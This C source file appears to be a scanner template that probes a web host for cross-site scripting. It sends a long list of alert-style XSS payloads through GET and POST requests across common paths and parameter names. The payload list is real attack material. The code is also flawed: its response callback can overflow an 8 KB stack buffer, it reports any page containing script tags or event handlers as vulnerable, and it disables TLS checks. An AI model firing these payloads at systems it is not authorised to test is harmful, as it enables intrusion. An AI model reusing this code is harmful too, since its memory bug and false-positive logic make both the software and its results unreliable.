/*
 * @id: xss-detection-c
 * @name: Cross-Site Scripting (XSS) Detection
 * @author: CERT-X-GEN Security Team
 * @severity: high
 * @description: Detects reflected and stored XSS vulnerabilities by testing input reflection
 * @tags: xss, cross-site-scripting, injection, javascript, cwe-79, web
 * @cwe: CWE-79
 * @cvss: 6.1
 * @references: https://cwe.mitre.org/data/definitions/79.html, https://owasp.org/www-community/attacks/xss/
 * @confidence: 85
 * @version: 1.0.0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>
#include <json-c/json.h>

// Template configuration
typedef struct {
    char id[256];
    char name[256];
    char author[256];
    char severity[32];
    int confidence;
    char tags[512];
    char cwe[32];
} TemplateConfig;

// Finding structure
typedef struct {
    char template_id[256];
    char severity[32];
    int confidence;
    char title[512];
    char description[1024];
    char evidence[2048];
    char cwe[32];
    float cvss_score;
    char remediation[1024];
    char references[1024];
} Finding;

// Global variables
static TemplateConfig config;
static char target_host[256] = {0};
static int target_port = 80;
static int json_output = 0;

// XSS payloads
static const char* xss_payloads[] = {
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert('XSS')>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<svg onload=alert('XSS')>",
    "<svg onload=\"alert('XSS')\">",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror=\"alert('XSS')\">",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=\"alert('XSS')\">",
    "<marquee onstart=alert('XSS')>",
    "<div onmouseover=alert('XSS')>",
    "<a href=\"javascript:alert('XSS')\">",
    "<form><button formaction=\"javascript:alert('XSS')\">",
    "<object data=\"javascript:alert('XSS')\">",
    "<embed src=\"javascript:alert('XSS')\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    "<style>@import\"javascript:alert('XSS')\";</style>",
    "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
    "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
    "<table background=\"javascript:alert('XSS')\">",
    "<td background=\"javascript:alert('XSS')\">",
    "<th background=\"javascript:alert('XSS')\">",
    "<tr background=\"javascript:alert('XSS')\">",
    "<tbody background=\"javascript:alert('XSS')\">",
    "<tfoot background=\"javascript:alert('XSS')\">",
    "<thead background=\"javascript:alert('XSS')\">",
    "<col background=\"javascript:alert('XSS')\">",
    "<colgroup background=\"javascript:alert('XSS')\">",
    "<legend background=\"javascript:alert('XSS')\">",
    "<fieldset background=\"javascript:alert('XSS')\">",
    "<frameset background=\"javascript:alert('XSS')\">",
    "<frame background=\"javascript:alert('XSS')\">",
    "<iframe background=\"javascript:alert('XSS')\">",
    "<applet code=\"javascript:alert('XSS')\">",
    "<param name=\"src\" value=\"javascript:alert('XSS')\">",
    "<base href=\"javascript:alert('XSS')\">",
    "<bgsound src=\"javascript:alert('XSS')\">",
    "<blink>",
    "<comment><img src=\"\"><script>alert('XSS')</script>",
    "<isindex action=\"javascript:alert('XSS')\">",
    "<listing><script>alert('XSS')</script></listing>",
    "<plaintext><script>alert('XSS')</script>",
    "<xmp><script>alert('XSS')</script></xmp>",
    "<noembed><script>alert('XSS')</script></noembed>",
    "<noscript><script>alert('XSS')</script></noscript>",
    "<noframes><script>alert('XSS')</script></noframes>",
    "<nobr><script>alert('XSS')</script></nobr>",
    "<noembed><script>alert('XSS')</script></noembed>",
    "<noframes><script>alert('XSS')</script></noframes>",
    "<noscript><script>alert('XSS')</script></noscript>",
    "<nobr><script>alert('XSS')</script></nobr>",
    NULL
};

// Common XSS parameters
static const char* xss_params[] = {
    "q", "query", "search", "s", "keyword", "keywords", "term", "terms",
    "name", "title", "subject", "message", "comment", "description", "content",
    "text", "input", "value", "data", "info", "details", "note", "notes",
    "user", "username", "login", "email", "mail", "address", "url", "link",
    "id", "ref", "reference", "code", "token", "key", "param", "parameter",
    "filter", "sort", "order", "limit", "offset", "page", "p", "size",
    "category", "cat", "type", "status", "state", "mode", "view", "format",
    "lang", "language", "locale", "country", "region", "city", "zip",
    "phone", "fax", "mobile", "home", "work", "office", "company",
    "first", "last", "middle", "nick", "nickname", "alias", "handle",
    "birth", "birthday", "age", "gender", "sex", "marital", "occupation",
    "education", "degree", "school", "university", "college", "major",
    "skill", "skills", "experience", "hobby", "hobbies", "interest",
    "preference", "preferences", "setting", "settings", "config", "option",
    "choice", "selection", "pick", "choose", "select", "radio", "checkbox",
    "file", "upload", "download", "attachment", "document", "image", "photo",
    "picture", "video", "audio", "media", "resource", "asset", "item",
    "product", "service", "offer", "deal", "promotion", "discount", "sale",
    "price", "cost", "amount", "quantity", "number", "count", "total",
    "subtotal", "tax", "shipping", "delivery", "payment", "billing",
    "credit", "card", "account", "bank", "transaction", "order", "purchase",
    "buy", "sell", "trade", "exchange", "return", "refund", "cancel",
    "confirm", "approve", "reject", "accept", "decline", "submit", "send",
    "post", "publish", "share", "like", "follow", "subscribe", "unsubscribe",
    "register", "signup", "signin", "login", "logout", "password", "pass",
    "pwd", "secret", "key", "token", "session", "cookie", "auth", "authz",
    "permission", "role", "group", "team", "member", "admin", "user",
    "guest", "visitor", "customer", "client", "partner", "vendor", "supplier",
    NULL
};

// HTTP response callback
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    char* response = (char*)userp;
    strncat(response, (char*)contents, realsize);
    return realsize;
}

// Check for XSS indicators in response
int check_xss_response(const char* response, const char* payload) {
    if (!response || !payload) return 0;
    
    // Check if payload appears unescaped in response
    if (strstr(response, payload)) {
        return 1;
    }
    
    // Check for common XSS indicators
    const char* xss_indicators[] = {
        "<script>", "</script>", "javascript:", "onerror=", "onload=",
        "onclick=", "onmouseover=", "onfocus=", "onblur=", "onchange=",
        "onsubmit=", "onreset=", "onselect=", "onkeydown=", "onkeyup=",
        "onkeypress=", "onmousedown=", "onmouseup=", "onmousemove=",
        "onmouseout=", "onmouseenter=", "onmouseleave=", "ondblclick=",
        "oncontextmenu=", "onwheel=", "ontouchstart=", "ontouchend=",
        "ontouchmove=", "ontouchcancel=", "onresize=", "onscroll=",
        "onabort=", "oncanplay=", "oncanplaythrough=", "ondurationchange=",
        "onemptied=", "onended=", "onerror=", "onloadeddata=",
        "onloadedmetadata=", "onloadstart=", "onpause=", "onplay=",
        "onplaying=", "onprogress=", "onratechange=", "onseeked=",
        "onseeking=", "onstalled=", "onsuspend=", "ontimeupdate=",
        "onvolumechange=", "onwaiting=", "onbeforeunload=", "onhashchange=",
        "onpagehide=", "onpageshow=", "onpopstate=", "onstorage=",
        "onunload=", "onbeforeprint=", "onafterprint=", "ononline=",
        "onoffline=", "onmessage=", "onopen=", "onclose=", "onerror=",
        NULL
    };
    
    for (int i = 0; xss_indicators[i]; i++) {
        if (strstr(response, xss_indicators[i])) {
            return 1;
        }
    }
    
    return 0;
}

// Test XSS on a parameter
int test_xss_param(const char* host, int port, const char* path, 
                  const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    char post_data[1024];
    
    // Build URL
    snprintf(url, sizeof(url), "http://%s:%d%s", host, port, path);
    
    // Build POST data
    snprintf(post_data, sizeof(post_data), "%s=%s", param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_xss_response(response, payload);
    }
    
    return 0;
}

// Test GET parameter XSS
int test_get_xss(const char* host, int port, const char* path, 
                const char* param, const char* payload) {
    CURL* curl;
    CURLcode res;
    char url[1024];
    char response[8192] = {0};
    
    // Build URL with parameter
    snprintf(url, sizeof(url), "http://%s:%d%s?%s=%s", host, port, path, param, payload);
    
    curl = curl_easy_init();
    if (!curl) {
        return 0;
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CERT-X-GEN/1.0");
    
    res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    if (res == CURLE_OK) {
        return check_xss_response(response, payload);
    }
    
    return 0;
}

// Create a finding
void create_finding(Finding* finding, const char* title, const char* description, 
                   const char* evidence, const char* severity) {
    strncpy(finding->template_id, config.id, sizeof(finding->template_id) - 1);
    strncpy(finding->severity, severity ? severity : config.severity, sizeof(finding->severity) - 1);
    finding->confidence = config.confidence;
    strncpy(finding->title, title, sizeof(finding->title) - 1);
    strncpy(finding->description, description, sizeof(finding->description) - 1);
    strncpy(finding->evidence, evidence, sizeof(finding->evidence) - 1);
    strncpy(finding->cwe, config.cwe, sizeof(finding->cwe) - 1);
    
    // Calculate CVSS score
    if (strcmp(finding->severity, "critical") == 0) {
        finding->cvss_score = 9.0;
    } else if (strcmp(finding->severity, "high") == 0) {
        finding->cvss_score = 7.5;
    } else if (strcmp(finding->severity, "medium") == 0) {
        finding->cvss_score = 5.0;
    } else if (strcmp(finding->severity, "low") == 0) {
        finding->cvss_score = 3.0;
    } else {
        finding->cvss_score = 0.0;
    }
    
    strncpy(finding->remediation, "Implement proper input validation and output encoding to prevent XSS attacks", 
            sizeof(finding->remediation) - 1);
    strncpy(finding->references, "https://cwe.mitre.org/data/definitions/79.html,https://owasp.org/www-community/attacks/xss/", 
            sizeof(finding->references) - 1);
}

// Output finding as JSON
void output_finding_json(const Finding* finding) {
    printf("  {\n");
    printf("    \"template_id\": \"%s\",\n", finding->template_id);
    printf("    \"severity\": \"%s\",\n", finding->severity);
    printf("    \"confidence\": %d,\n", finding->confidence);
    printf("    \"title\": \"%s\",\n", finding->title);
    printf("    \"description\": \"%s\",\n", finding->description);
    printf("    \"evidence\": %s,\n", finding->evidence);
    printf("    \"cwe\": \"%s\",\n", finding->cwe);
    printf("    \"cvss_score\": %.1f,\n", finding->cvss_score);
    printf("    \"remediation\": \"%s\",\n", finding->remediation);
    printf("    \"references\": [\"%s\"]\n", finding->references);
    printf("  }");
}

// Main scanning logic
int execute_scan() {
    Finding findings[64];
    int finding_count = 0;
    
    // Common paths to test
    const char* test_paths[] = {
        "/", "/search", "/user", "/admin", "/api", "/api/users",
        "/products", "/articles", "/posts", "/comments", "/profile",
        "/dashboard", "/settings", "/account", "/register", "/contact",
        "/feedback", "/support", "/help", "/about", "/news", "/blog",
        "/forum", "/chat", "/message", "/inbox", "/outbox", "/compose",
        "/edit", "/update", "/create", "/new", "/add", "/delete",
        "/remove", "/modify", "/change", "/replace", "/submit",
        "/upload", "/download", "/file", "/image", "/photo", "/video",
        "/audio", "/document", "/attachment", "/resource", "/asset",
        NULL
    };
    
    for (int i = 0; test_paths[i] && finding_count < 64; i++) {
        const char* path = test_paths[i];
        
        // Test each parameter with each payload
        for (int j = 0; xss_params[j] && finding_count < 64; j++) {
            const char* param = xss_params[j];
            
            for (int k = 0; xss_payloads[k] && finding_count < 64; k++) {
                const char* payload = xss_payloads[k];
                
                // Test GET parameter
                if (test_get_xss(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"GET\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "XSS in GET parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "Cross-site scripting vulnerability detected in GET parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
                
                // Test POST parameter
                if (test_xss_param(target_host, target_port, path, param, payload)) {
                    char evidence[2048];
                    char title[512];
                    char description[1024];
                    
                    snprintf(evidence, sizeof(evidence), 
                            "{\"endpoint\": \"http://%s:%d%s\", \"parameter\": \"%s\", \"payload\": \"%s\", \"method\": \"POST\"}", 
                            target_host, target_port, path, param, payload);
                    
                    snprintf(title, sizeof(title), "XSS in POST parameter '%s' on %s", 
                            param, path);
                    
                    snprintf(description, sizeof(description), 
                            "Cross-site scripting vulnerability detected in POST parameter '%s' on %s:%d%s", 
                            param, target_host, target_port, path);
                    
                    create_finding(&findings[finding_count], title, description, evidence, "high");
                    finding_count++;
                    break; // Found vulnerability, move to next parameter
                }
            }
        }
    }
    
    // Output findings
    if (json_output) {
        printf("[\n");
        for (int i = 0; i < finding_count; i++) {
            if (i > 0) printf(",\n");
            output_finding_json(&findings[i]);
        }
        printf("\n]\n");
    } else {
        if (finding_count > 0) {
            printf("\n[+] Found %d XSS vulnerability(ies):\n\n", finding_count);
            for (int i = 0; i < finding_count; i++) {
                printf("[%s] %s\n", findings[i].severity, findings[i].title);
                printf("    %s\n", findings[i].description);
                printf("\n");
            }
        } else {
            printf("\n[-] No XSS vulnerabilities found\n");
        }
    }
    
    return finding_count;
}

// Get environment variable
char* get_env_var(const char* name) {
    return getenv(name);
}

// Parse arguments
int parse_args(int argc, char* argv[]) {
    // Initialize default config
    strncpy(config.id, "xss-detection", sizeof(config.id) - 1);
    strncpy(config.name, "Cross-Site Scripting (XSS) Detection", sizeof(config.name) - 1);
    strncpy(config.author, "CERT-X-GEN Team", sizeof(config.author) - 1);
    strncpy(config.severity, "high", sizeof(config.severity) - 1);
    config.confidence = 80;
    strncpy(config.tags, "xss,injection,web,client-side", sizeof(config.tags) - 1);
    strncpy(config.cwe, "CWE-79", sizeof(config.cwe) - 1);
    
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0) {
            if (i + 1 < argc) {
                strncpy(target_host, argv[++i], sizeof(target_host) - 1);
            } else {
                fprintf(stderr, "Error: --target requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--port") == 0) {
            if (i + 1 < argc) {
                target_port = atoi(argv[++i]);
            } else {
                fprintf(stderr, "Error: --port requires an argument\n");
                return 0;
            }
        } else if (strcmp(argv[i], "--json") == 0) {
            json_output = 1;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [OPTIONS] <target>\n\n", argv[0]);
            printf("%s\n", config.name);
            printf("\nOptions:\n");
            printf("  --target <HOST>  Target host or IP address\n");
            printf("  --port <PORT>    Target port (default: 80)\n");
            printf("  --json           Output findings as JSON\n");
            printf("  --help           Show this help message\n");
            exit(0);
        } else if (!target_host[0] && argv[i][0] != '-') {
            strncpy(target_host, argv[i], sizeof(target_host) - 1);
        }
    }
    
    // Check environment variables (for CERT-X-GEN engine integration)
    if (!target_host[0]) {
        char* host = get_env_var("CERT_X_GEN_TARGET_HOST");
        if (host) {
            strncpy(target_host, host, sizeof(target_host) - 1);
        }
    }
    
    char* port_str = get_env_var("CERT_X_GEN_TARGET_PORT");
    if (port_str) {
        target_port = atoi(port_str);
    }
    
    if (get_env_var("CERT_X_GEN_MODE")) {
        json_output = 1;
    }
    
    if (!target_host[0]) {
        fprintf(stderr, "Error: No target specified\n");
        return 0;
    }
    
    return 1;
}

int main(int argc, char* argv[]) {
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    // Parse arguments
    if (!parse_args(argc, argv)) {
        curl_global_cleanup();
        return 1;
    }
    
    // Print banner (if not JSON output)
    if (!json_output) {
        printf("\n╔════════════════════════════════════════════════════════════╗\n");
        printf("║  %-52s ║\n", config.name);
        printf("║  CERT-X-GEN Security Template                              ║\n");
        printf("╚════════════════════════════════════════════════════════════╝\n\n");
        printf("Target: %s:%d\n", target_host, target_port);
    }
    
    // Execute the scan
    int finding_count = execute_scan();
    
    // Cleanup
    curl_global_cleanup();
    
    return 0;
}
